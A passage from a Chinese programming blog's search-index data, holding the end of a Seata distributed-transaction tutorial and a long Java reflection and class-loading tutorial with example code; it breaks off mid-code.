`account_db`; USE `account_db`; DROP TABLE IF EXISTS `account_tbl`; CREATE TABLE `account_tbl` ( `id` int(11) NOT NULL AUTO_INCREMENT, `user_id` varchar(255) DEFAULT NULL, `money` int(11) DEFAULT 0, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; INSERT INTO account_tbl (user_id, money) VALUES (\u0026#39;1\u0026#39;, 10000); -- 注意此处0.3.0+ 增加唯一索引 ux_undo_log DROP TABLE IF EXISTS `undo_log`; CREATE TABLE `undo_log` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `branch_id` bigint(20) NOT NULL, `xid` varchar(100) NOT NULL, `context` varchar(128) NOT NULL, `rollback_info` longblob NOT NULL, `log_status` int(11) NOT NULL, `log_created` datetime NOT NULL, `log_modified` datetime NOT NULL, `ext` varchar(100) DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `ux_undo_log` (`xid`,`branch_id`) ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; ApiPost接口测试 Apipost-API 文档、设计、调试、自动化测试一体化协作平台\n根据代码逻辑创建对应接口\n本地事务测试 @Transactional注解是 Spring 提供的声明式事务管理注解，用于标记方法或类，使其在方法执行期间自动管理事务（开启、提交或回滚）。\n使用@Transactional注解时需要在自己的启动类上添加@EnableTransactionManagement注解才能正常使用\n1 2 3 4 5 6 7 8 @Transactional 本地事务 //当使用Transactional注解时，如果count=5那么会自动回滚事务 @Override public void deduct(String commodityCode, int count) { storageTblMapper.deduct(commodityCode, count); if (count == 5) { throw new RuntimeException(\u0026#34;库存不足\u0026#34;); } } 打通远程调用 使用OpenFeign远程调用对应的微服务\n采购business需要远程调用库存服务和订单服务，那么在采购模块中创建OpenFeign\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @Service public class BusinessServiceImpl implements BusinessService { @Autowired StorageFeignClient storageFeignClient; @Autowired OrderFeignClient orderFeignClient; @GlobalTransactional @Override public void purchase(String userId, String commodityCode, int orderCount) { //1. 扣减库存 storageFeignClient.deduct(commodityCode, orderCount); //2. 创建订单 orderFeignClient.create(userId, commodityCode, orderCount); } } 引入Seata解决分布式事务 下载Seata服务 Seata Java Download | Apache Seata\n1 2 3 4 seata-server.bat //直接运行即可 http://127.0.0.1:7091/#/login //Web界面地址 默认账户密码：seata/seata http://127.0.0.1:8091 //监听地址 项目文件中引入Seata依赖\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-seata\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 在每个项目的配置文件中创建一个名为file.conf的文件，内容如下\n1 2 3 4 5 6 7 8 9 10 service { #transaction service group mapping vgroupMapping.default_tx_group = \u0026#34;default\u0026#34; #only support when registry.type=file, please don\u0026#39;t set multiple addresses default.grouplist = \u0026#34;127.0.0.1:8091\u0026#34; #degrade, current not support enableDegrade = false #disable seata disableGlobalTransaction = false } 使用Seata 使用Seata需要在最开始的请求地方加上@GlobalTransactional注解\n@GlobalTransactional 是 Seata 提供的一个注解，用于声明一个方法或类需要进行 全局事务管理。它是 Seata 分布式事务解决方案的核心注解之一，用于确保跨多个微服务或数据库的操作要么全部成功，要么全部回滚。\n1 2 3 4 5 6 7 8 9 @GlobalTransactional @Override public void purchase(String userId, String commodityCode, int orderCount) { //1. 扣减库存 storageFeignClient.deduct(commodityCode, orderCount); //2. 创建订单 orderFeignClient.create(userId, commodityCode, orderCount); } Seata原理 二阶提交协议 二阶提交协议：事务提交分为两个阶段，第一阶段是本地事务提交，包含（业务修改数据的提交和undo_log日志的提交）。第二阶段只有两个步骤（成功提交和失败回滚），如果成功提交，所以人删除undo_log日志。如果提交失败，所有人拿到自己的前镜像，恢复数据，删除undo_log\n四种事务模式 Seata AT 模式 | Apache Seata\n默认使用AT模式，如果想使用其它模式，可以在配置文件中添加\n1 2 seata: data-source-proxy-mode: XA ","date":"2025-06-10T14:11:55+08:00","image":"https://lserein.github.io/p/seata/Seata_hu_3e17fd9a8bb95161.png","permalink":"https://lserein.github.io/p/seata/","title":"Seata"},{"content":"1.Java反射专题 反射机制允许程序在执行期借助于Reflection API取得任何类的内部信息（比如成员变量，构造器，成员方法等等)，并能操作对像的属性及方法。反射在设计模式和框架底层都会用到。反射面前一切都是纸老虎\n1.1.反射是什么\u0026mdash;一个需求引出反射 1 2 3 根据配置文件re.properties内容，创建Cat对象并调用hi方法 classfullpath=com.edu.Cat method=hi 开闭原则（ocp原则）：不修改源码，来扩展功能\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public class Question { public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { //根据配置文件re.properties内容，创建Cat对象并调用hi方法 //使用之前学的无法解决，只能使用反射进行解决 //使用Properties类读取配置文件 Properties properties = new Properties(); properties.load(new FileInputStream(\u0026#34;src\\\\re.properties\u0026#34;)); String classfullpath = properties.get(\u0026#34;classfullpath\u0026#34;).toString(); String methodName = properties.get(\u0026#34;method\u0026#34;).toString(); System.out.println(classfullpath); System.out.println(methodName); //1.加载类,返回class类型的对象cls Class cls = Class.forName(classfullpath); //2.通过cls得到你加载类的对象示例 Object object = cls.newInstance(); System.out.println(\u0026#34;object对象的运行类型\u0026#34;+object.getClass()); //运行类型 //3.通过cls得到你加载的类com.edu.Cat的methodName \u0026#34;hi\u0026#34;对象 //即：在反射中，可以把方法视为对象，万物皆对象 Method method1 = cls.getMethod(methodName); //通过method1调用方法invode method1.invoke(object); } } 1.2.反射原理图 这张图片展示了Java程序的三个主要阶段：代码阶段/编译阶段、Class类阶段（加载阶段）和Runtime运行阶段。\n1 2 3 在这个阶段，开发者编写Java源代码文件，例如Cat.java。 代码中定义了类Cat，包括私有字符串变量name、公共构造函数Cat()和公共方法hi()。 通过Java编译器，源代码被编译成字节码文件Cat.class。 1 2 3 在这个阶段，类加载器（ClassLoader）将字节码文件Cat.class加载到内存中。 加载后，形成了Class对象，包含了类的元数据，如成员变量（Field）、构造器（Constructor）和成员方法（Method）。 这些元数据存储在堆内存中，供后续的运行时使用。 1 2 3 4 5 6 在运行时阶段，Java虚拟机（JVM）执行字节码。 通过new Cat()创建Cat类的实例对象cat。 该对象知道它属于哪个Class对象，并且可以通过该Class对象访问其元数据。 得到Class对象后，可以进行以下操作： 创建对象，调用构造函数。 操作对象的属性和方法。 1.3.反射机制 1.3.1.java.lang.reflect.Field\u0026mdash;获取某个类的字段 ** java.lang.reflect.Field:代表类的成员变量，Field类表示某个类的成员变量**\n获取某个类的字段\ngetField不能获取private修饰的私有属性\ngetDeclaredField可用来获取私有属性\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package com.edu.reflection; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.Properties; public class Reflection1 { public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException { //使用Properties类读取配置文件 Properties properties = new Properties(); properties.load(new FileInputStream(\u0026#34;src\\\\re.properties\u0026#34;)); String classfullpath = properties.get(\u0026#34;classfullpath\u0026#34;).toString(); String methodName = properties.get(\u0026#34;method\u0026#34;).toString(); //1.加载类,返回class类型的对象cls Class cls = Class.forName(classfullpath); //2.通过cls得到你加载类的对象示例 Object object = cls.newInstance(); System.out.println(\u0026#34;object对象的运行类型\u0026#34;+object.getClass()); //运行类型 //3.通过cls得到你加载的类com.edu.Cat的methodName \u0026#34;hi\u0026#34;对象 //即：在反射中，可以把方法视为对象，万物皆对象 Method method1 = cls.getMethod(methodName); //通过method1调用方法invode method1.invoke(object); //java.lang.reflect.Field:代表类的成员变量，Field类表示某个类的成员变量 //获取某个类的字段 // getField不能获取私有的属性 Field name = cls.getField(\u0026#34;age\u0026#34;); System.out.println(name.get(object)); //10 //getDeclaredField可用来获取私有属性 Field name1 = cls.getDeclaredField(\u0026#34;name\u0026#34;); name1.setAccessible(true); System.out.println(name1.get(object)); } } 1.3.2.java.lang.reflect.Constructor：获取构造器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 java.lang.reflect.Constructor：代表类的构造方法，Constructor表示构造器 //1.加载类,返回class类型的对象cls Class cls = Class.forName(classfullpath); //2.通过cls得到你加载类的对象示例 Object object = cls.newInstance(); System.out.println(\u0026#34;object对象的运行类型\u0026#34;+object.getClass()); //运行类型 //3.通过cls得到你加载的类com.edu.Cat的methodName \u0026#34;hi\u0026#34;对象 //即：在反射中，可以把方法视为对象，万物皆对象 Method method1 = cls.getMethod(methodName); //通过method1调用方法invode method1.invoke(object); //java.lang.reflect.Constructor：代表类的构造方法，Constructor表示构造器 //获取无参构造器 Constructor constructor = cls.getConstructor(); System.out.println(constructor); //获取有参构造器 Constructor constructor1 = cls.getConstructor(String.class); //这里的String.class就是String类的Class对象 System.out.println(constructor1); 1.4.反射的优点与缺点 优点：可以动态的创建和使用对象（也是框架底层核心），使用灵活，没有反射机制，框架技术就失去底层支撑。\n缺点：使用反射是基于解释执行，对执行速度有影响\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 public class Reflection2 { public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException { m1(); m2(); m3(); } //使用传统方法创建Cat对象耗时 public static void m1(){ long start = System.currentTimeMillis(); for (int i = 0;i\u0026lt;1000000;i++){ Cat cat = new Cat(); } long end = System.currentTimeMillis(); System.out.println(\u0026#34;传统方法耗时：\u0026#34;+(end-start)); } public static void m2() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { long start = System.currentTimeMillis(); Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;com.edu.Cat\u0026#34;); Object o = cls.newInstance(); Method hi = cls.getMethod(\u0026#34;hi\u0026#34;); for (int i = 0;i\u0026lt;1000000;i++){ hi.invoke(o); } long end = System.currentTimeMillis(); System.out.println(\u0026#34;反射方法耗时：\u0026#34;+(end-start)); } public static void m3() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { long start = System.currentTimeMillis(); Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;com.edu.Cat\u0026#34;); Object o = cls.newInstance(); Method hi = cls.getMethod(\u0026#34;hi\u0026#34;); hi.setAccessible(true); for (int i = 0;i\u0026lt;1000000;i++){ hi.invoke(o); } long end = System.currentTimeMillis(); System.out.println(\u0026#34;反射方法耗时：\u0026#34;+(end-start)); } } 1.5.通过反射获取类的结构信息 //getName：获取全类名\n//getSimpleName:获取简单类名\n//getFields:获取所有public修饰的属性，包括本类以及父类的\n//getDeclaredFields:获取本类中所有属性\n//getMethods:获取所有public修饰的方法，包含本类以及父类\n//getDeclaredMethods:获取本类中所有方法\n//getConstructors:获取public修饰的构造器，只包含本类不包含父类\n//getDeclaredConstructors:获取本类中所有构造器\n//getPackage:以package形式返回包信息\n//getSuperclass:以class形式返回父类信息\n//getInterfaces:以Class形式返回接口信息\n//getAnnotations:以Annotation[]形式返回注解信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 package com.edu.reflection; import org.junit.Test; import java.lang.annotation.Annotation; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.Method; /* * 演示如何通过反射获取类的结构信息 * */ public class ReflectionUtils { public static void main(String[] args) { } //第一组方法API @Test public void api01() throws ClassNotFoundException { //得到class对象 Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;com.edu.reflection.Person\u0026#34;); //getName：获取全类名 System.out.println(cls.getName()); //com.edu.reflection.Person //getSimpleName:获取简单类名 System.out.println(cls.getSimpleName());//Person //getFields:获取所有public修饰的属性，包括本类以及父类的 Field[] fields = cls.getFields(); for (Field field : fields) { System.out.println(field.getName()); //hobby,name } //getDeclaredFields:获取本类中所有属性 Field[] declaredFields = cls.getDeclaredFields(); for (Field declaredField : declaredFields) { System.out.println(declaredField.getName()); //name,age,job,sal } //getMethods:获取所有public修饰的方法，包含本类以及父类 Method[] methods = cls.getMethods(); for (Method method : methods) { System.out.println(method.getName()); } //getDeclaredMethods:获取本类中所有方法 Method[] declaredMethods = cls.getDeclaredMethods(); for (Method declaredMethod : declaredMethods) { System.out.println(declaredMethod.getName()); } //getConstructors:获取public修饰的构造器，只包含本类 Constructor\u0026lt;?\u0026gt;[] constructors = cls.getConstructors(); //getDeclaredConstructors:获取本类中所有构造器 Constructor\u0026lt;?\u0026gt;[] declaredConstructors = cls.getDeclaredConstructors(); //getPackage:以package形式返回包信息 System.out.println(cls.getPackage()); //com.edu.reflection //getSuperclass:以class形式返回父类信息 Class\u0026lt;?\u0026gt; superclass = cls.getSuperclass(); System.out.println(superclass); //com.edu.reflection.A //getInterfaces:以Class形式返回接口信息 Class\u0026lt;?\u0026gt;[] interfaces = cls.getInterfaces(); for (Class\u0026lt;?\u0026gt; anInterface : interfaces) { System.out.println(anInterface.getName()); } //getAnnotations:以Annotation[]形式返回注解信息 Annotation[] annotations = cls.getAnnotations(); System.out.println(annotations); //Deprecated } } class A{ public String hobby; public void hi(){} } interface IA{ } interface IB{ } @Deprecated class Person extends A implements IA,IB{ //四种不同访问权限的属性 public String name; protected int age; String job; private double sal; public void m1(){} protected void m2(){} void m3(){} private void m4(){} } //getModifiers：以int形式返回修饰符，默认修饰符是0，public是1，private是2，protected是4，static是8，final是16\n如果有属性是punlic(1) static(8) = 9 修饰，那么他的结果是相加\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 public void api02() throws ClassNotFoundException{ //得到class对象 Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;com.edu.reflection.Person\u0026#34;); //getDeclaredFields:获取本类中所有属性 Field[] declaredFields = cls.getDeclaredFields(); for (Field declaredField : declaredFields) { System.out.println(declaredField.getName()); //name,age,job,sal System.out.println(\u0026#34;该属性的修饰符值=\u0026#34;+declaredField.getModifiers()); System.out.println(\u0026#34;该属性对应的类型\u0026#34;+declaredField.getType()); //class java.lang.String } //getDeclaredMethods:获取本类中所有方法 Method[] declaredMethods = cls.getDeclaredMethods(); for (Method declaredMethod : declaredMethods) { System.out.println(\u0026#34;本类中所有方法：\u0026#34;+declaredMethod.getName()); System.out.println(\u0026#34;本类中方法所对应修饰符的值\u0026#34;+declaredMethod.getModifiers()); System.out.println(\u0026#34;该方法返回类型\u0026#34;+declaredMethod.getReturnType()); //void //输出当前这个方法的形参数组情况 Class\u0026lt;?\u0026gt;[] parameterTypes = declaredMethod.getParameterTypes(); for (Class\u0026lt;?\u0026gt; parameterType : parameterTypes) { System.out.println(\u0026#34;该方法的形参类型\u0026#34;+parameterType); } } } 1.6.通过反射爆破创建对象实例 方法1：调用类中的public修饰的无参构造器\n方法2：调用类中的指定构造器\nClass类相关方法：\n1 2 3 newInstance：调用类中的无参构造器，获取对应类的对象 getConstructor(Class...clazz)：根据参数列表，获取对应的public构造器对象 getDecalaredConstructor(Class...clazz):根据参数列表，获取对应的所有构造器对象 Constructor类相关方法：\n1 2 setAccessible：爆破 newInstance(Object...obj):调用构造器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 package com.edu; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; /* * 演示通过反射机制创建实例 * */ public class CreateInstance { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { //1.先获取User类的Class对象 Class\u0026lt;?\u0026gt; Userclass = Class.forName(\u0026#34;com.edu.User\u0026#34;); //2.通过public的无参构造器创建实例 Object o = Userclass.newInstance(); System.out.println(o); //姓名为张三*******年龄为13 //3.通过public的有参构造器创建实例 //此时此刻，这个constructor对象就是下面这个构造器 /* * public User(String name){ //public有参构造器 this.name = name; */ //3.1.先得到对应的构造器,getConstructor返回public的构造器 Constructor\u0026lt;?\u0026gt; constructor = Userclass.getConstructor(String.class); //3.2.创建实例，并传入实参 Object lisi = constructor.newInstance(\u0026#34;lisi\u0026#34;); System.out.println(lisi); //姓名为lisi*******年龄为13 //4.通过非public的有参构造器创建实例---私有 Constructor\u0026lt;?\u0026gt; declaredConstructor = Userclass.getDeclaredConstructor(int.class, String.class); declaredConstructor.setAccessible(true); //爆破，使用反射可以访问私有的private构造器 Object o1 = declaredConstructor.newInstance(18,\u0026#34;wangwu\u0026#34;); System.out.println(o1); } } class User{ private int age = 13; private String name = \u0026#34;张三\u0026#34;; public User(){} //无参 public public User(String name){ //public有参构造器 this.name = name; } private User(int age,String name){ //有参 私有 this.age = age; this.name = name; } @Override public String toString() { return \u0026#34;姓名为\u0026#34;+name+\u0026#34;*******年龄为\u0026#34;+age; } } 1.7.通过反射爆破操作属性 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package com.edu; import java.lang.reflect.Field; /* * 演示反射访问操作属性 * */ public class ReflectAccess { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException { //1.得到Student类对应的class对象 Class\u0026lt;?\u0026gt; StuClass = Class.forName(\u0026#34;com.edu.Student\u0026#34;); //2.创建一个对象 Object o = StuClass.newInstance(); //o的运行类型为Student //3.使用反射得到age属性对象 Field age = StuClass.getField(\u0026#34;age\u0026#34;); //通过反射操作age属性 age.set(o,18); //反射操作name属性，name属性私有且静态 Field name = StuClass.getDeclaredField(\u0026#34;name\u0026#34;); //对name进行爆破 name.setAccessible(true); //name.set(o,\u0026#34;张三\u0026#34;); name.set(null,\u0026#34;张三\u0026#34;); //因为name有static属性，所以o也可以写成null System.out.println(o); } } class Student{ public int age; private static String name; public Student(){ } @Override public String toString() { return \u0026#34;Student{\u0026#34; + \u0026#34;age=\u0026#34; + age + \u0026#34;.......\u0026#34; + \u0026#34;name\u0026#34; + name + \u0026#39;}\u0026#39;; } } 1.8.通过反射爆破操作方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package com.edu; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; /* * 演示反射调用方法 * */ public class ReflectAccessMethod { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { //1.得到Boss类对应的class对象 Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;com.edu.Boss\u0026#34;); //2.创建对象 Object o = cls.newInstance(); //3.得到hi方法对象 Method hi = cls.getMethod(\u0026#34;hi\u0026#34;,String.class); //4.调用方法 Object invoke = hi.invoke(o,\u0026#34;666\u0026#34;); Method say = cls.getDeclaredMethod(\u0026#34;say\u0026#34;, int.class, String.class, char.class); say.setAccessible(true); Object invoke1 = say.invoke(o, 100, \u0026#34;张三\u0026#34;, \u0026#39;男\u0026#39;); System.out.println(invoke1); //因为say方法是静态的，所以对象位置可以使用null代替 System.out.println(say.invoke(null, 99, \u0026#34;小红\u0026#34;, \u0026#39;女\u0026#39;)); //5.在反射中，如果方法有返回值，统一返回object } } class Boss{ public int age; private static String name; public Boss(){} private static String say(int n,String s,char c){ return n + \u0026#34;\u0026#34; + s + \u0026#34;\u0026#34; + c; } public void hi(String s){ System.out.println(\u0026#34;hi\u0026#34;+s); } } 1.9.小练习 利用反射和File完成以下功能\n1.利用Class类的forName方法得到File类的class对象\n2.在控制台打印File类的所有构造器\n3.通过newInstance的方法创建File对象，并创建mynew.txt文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package com.edu.homework; import java.io.File; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; /* * */ public class homework2 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException { //1.利用Class类的forName方法得到File类的class对象 Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;java.io.File\u0026#34;); //2.得到所有构造器 Constructor\u0026lt;?\u0026gt;[] declaredConstructors = cls.getDeclaredConstructors(); for (Constructor\u0026lt;?\u0026gt; declaredConstructor : declaredConstructors) { System.out.println(\u0026#34;File的构造器\u0026#34;+declaredConstructor); } //3.通过指定构造器创建文件file对象 Constructor\u0026lt;?\u0026gt; declaredConstructor = cls.getDeclaredConstructor(String.class); String filepath = \u0026#34;E:\\\\mynew.txt\u0026#34;; Object fileobject = declaredConstructor.newInstance(filepath); //创建file对象，运行类型就是File //4.得到createNewFile的方法对象 Method createNewFile = cls.getMethod(\u0026#34;createNewFile\u0026#34;); createNewFile.invoke(fileobject); //创建文件，调用createNewFile // System.out.println(fileobject.getClass()); System.out.println(\u0026#34;创建文件成功：\u0026#34;+filepath); } } 2.Class类 1 2 3 4 5 6 7 8 1.Class也是类，因此也继承object类[类图] 2.Class类对象不是new出来的，而是系统创建的 3.对于某个类的Class类对象，在内存中只有一份，因为类只加载一次 4.每个类的实例都会记得自己是由哪个Class实例所生成 5.通过Class可以完整地得到一个类的完整结构,通过一系列API 6.Class对象是存放在堆的 7.类的字节码二进制数据，是放在方法区的，有的地方称为类的元数据（包括方法代码， 变量名，方法名，访问权限等等) https://www.zhihu.com/question/38496907\n1 2 3 4 5 //3.对于某个类的Class类对象，在内存中只有一份，因为类只加载一次 Class\u0026lt;?\u0026gt; cls1 = Class.forName(\u0026#34;com.edu.Cat\u0026#34;); Class\u0026lt;?\u0026gt; cls2 = Class.forName(\u0026#34;com.edu.Cat\u0026#34;); System.out.println(cls1.hashCode()); System.out.println(cls2.hashCode()); 2.1.Class类常用方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package com.edu.Class; import com.edu.Car; import java.lang.reflect.Field; public class class2 { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException { String classPath = \u0026#34;com.edu.Car\u0026#34;; //1.获取Car类对应的Class对象 //\u0026lt;?\u0026gt;表示不确定的Java类型 Class\u0026lt;?\u0026gt; cls = Class.forName(classPath); System.out.println(cls); //显示cls对象，是哪个类的Class对象 com.edu.Car System.out.println(cls.getClass()); //输出cls的运行类型 java.lang.Class //2.得到包名 ---- getPackage().getName() System.out.println(cls.getPackage().getName()); //com.edu //3.得到全类名 ----- getName() System.out.println(cls.getName()); //com.edu.Car //4.通过cls创建对象实例 ----newInstance() Car car = (Car)cls.newInstance(); System.out.println(car); //Car{brand=\u0026#39;宝马\u0026#39;, price=19999999, color=\u0026#39;红色\u0026#39;} //5.通过反射获取属性 ---getField Field field = cls.getField(\u0026#34;brand\u0026#34;); System.out.println(field.get(car)); //宝马 //6.通过反射修改属性 -------field.set(car,\u0026#34;奔驰\u0026#34;); field.set(car,\u0026#34;奔驰\u0026#34;); System.out.println(field.get(car)); //奔驰 //7.我希望获取到所有属性 --------cls.getFields() Field[] fields = cls.getFields(); for (Field field1 : fields) { System.out.println(field1.getName()); //brand price color } } } 2.2.获取Class对象的六种方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 /* * 获取class对象的各种方式 * */ public class GetClass { public static void main(String[] args) throws ClassNotFoundException { //1.已知一个类的全类名，且在类的类路径下，可通过Class的静态方法forname()获取 //应用场景：多用于配置文件，读取全路径加载类 Class\u0026lt;?\u0026gt; cls1 = Class.forName(\u0026#34;com.edu.Car\u0026#34;); System.out.println(cls1); //2.若知道具体类，通过类的class获取，该方式是最安全可靠，程序性能最高实例 //应用场景：多用于参数传递，比如通过反射得到对应构造器对象 Class\u0026lt;Car\u0026gt; cls2 = Car.class; System.out.println(cls2); //3.已知某个类的实例，调用该实例的getClass()方法获取Class对象 //应用场景：通过创建好的对象，获取Class对象 Car car = new Car(); Class\u0026lt;? extends Car\u0026gt; cls3 = car.getClass(); System.out.println(cls3); //4.通过类加载器【有4种类加载器】获取到类的Class对象 //(1)先获取类加载器 Car ClassLoader classLoader = car.getClass().getClassLoader(); //(2)通过类加载器得到class对象 Class\u0026lt;?\u0026gt; cls4 = classLoader.loadClass(\u0026#34;com.edu.Car\u0026#34;); System.out.println(cls4); //cls1 cls2 cls3 cls4其实是同一个对象 System.out.println(cls1.hashCode()); System.out.println(cls2.hashCode()); System.out.println(cls3.hashCode()); System.out.println(cls4.hashCode()); //5.基本数据类型(int,char,boolean,float,double,byte,long,short) //获取Class对象 Class cls5 = long.class; System.out.println(cls5); //6.基本数据类型对应的包装类，可通过.type得到Class类对象 Class cls6 = Integer.TYPE; System.out.println(cls6); } } 2.3.哪些类型有Class对象 1.外部类，成员内部类，静态内部类，局部内部类，匿名内部类\n2.interface 接口\n3.数组\n4.enum 枚举类型\n5.annotation：注解\n6.基本数据类型\n7.Void\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.edu.Class; import java.io.Serializable; public class AlltypeClass { public static void main(String[] args) { Class\u0026lt;String\u0026gt; cls1 = String.class; //外部类 Class\u0026lt;Serializable\u0026gt; cls2 = Serializable.class; //接口 Class\u0026lt;Integer[]\u0026gt; cls3 = Integer[].class; //数组 Class\u0026lt;float[][]\u0026gt; cls4 = float[][].class; //二维数组 Class\u0026lt;Deprecated\u0026gt; cls5 = Deprecated.class; //注解 Class\u0026lt;Thread.State\u0026gt; cls6 = Thread.State.class; //枚举 Class\u0026lt;Long\u0026gt; cls7 = long.class; //基本数据类型 Class\u0026lt;Void\u0026gt; cls8 = void.class; //void类型 Class\u0026lt;Class\u0026gt; cls9 = Class.class; // } } 3.类加载 3.1.动态加载与静态加载 静态加载：编译时加载相关类，如果没用则报错，依赖性太强\n动态加载：运行时加载需要的类，如果运行时不用该类，则不报错，降低了依赖性\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class Classload1 { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { Scanner sc = new Scanner(System.in); System.out.println(\u0026#34;请输入key\u0026#34;); String key = sc.next(); switch (key){ case \u0026#34;1\u0026#34; : Dog dog = new Dog(); //静态加载，编译时直接报错，依赖性强 dog.cry(); break; case \u0026#34;2\u0026#34;: //反射---\u0026gt;动态加载 Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;Dog\u0026#34;); //动态加载，编译时可通过，运行时没用该类才会报错 Object o = cls.newInstance(); Method method = cls.getMethod(\u0026#34;h1\u0026#34;); method.invoke(o); break; default: System.out.println(\u0026#34;do nothing....\u0026#34;); } } } 3.2.类加载流程图 类加载每个阶段需要干的事\n3.3.类加载5个阶段 3.3.1.加载阶段 JVM在该阶段的主要目的是将字节码从不同的数据源（可能是class文件、也可能是jar包，甚至网络)转化为二进制字节流加载到内存中，并生成一个代表该类的java.lang.Class对象\n3.3.2.连接阶段 验证阶段 目的是确保当前Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身安全\n包括：文件格式验证（是否以魔数 0xcafebabe开头）,元数据验证，字节码验证和符号引用验证\n可以考虑使用-X verify:none参数来关闭大部分类验证措施，缩短虚拟机类加载的时间\n准备阶段 1 2 3 4 5 6 7 8 class A{ //1.n1是实例变量，不是静态变量，因此在准备阶段，是不会分配内存的 //2.n2是静态变量，准备阶段需要分配内存，n2的默认值为0，而不是20，20是在初始化阶段进行赋值的 //3.n3是常量，他和静态变量不一样，因为一旦赋值就不变，n3 = 30 public int n1 = 10; public static int n2 = 20; public static final int n3 = 30; } 解析阶段 虚拟机将常量池内的符号引用替换为直接引用的过程\n3.3.3.初始化阶段 到初始化阶段才真正开始执行类中定义的Java程序代码，此阶段是执行()方法的过程。\n()方法由编译器**按语句在源文件中出现的顺序，依次收集类中所有静态变量的赋值动作和静态代码块中**的语句，并进行合并\n虚拟机会保证一个类的()方法在多线程环境中被正确的加锁，同步，如果多个线程同时去初始化一个类，那么只会有一个线程去执行这个类的()方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package com.edu.ClassLoad; /* * 类加载初始化阶段 * */ public class ClassLoad3 { public static void main(String[] args) { //1.加载B类，并生成 B的class对象 //2.连接 num = 0; //3.初始化阶段：依次收集类中所有静态变量的赋值动作和静态代码块中的语句,并合并 //client(){ // static { // System.out.println(\u0026#34;B 的静态代码块被执行\u0026#34;); // num = 300; // num = 100; // } //合并之后num=100 // } //new B(); System.out.println(B.num); } } class B{ static { System.out.println(\u0026#34;B 的静态代码块被执行\u0026#34;); num = 300; } static int num = 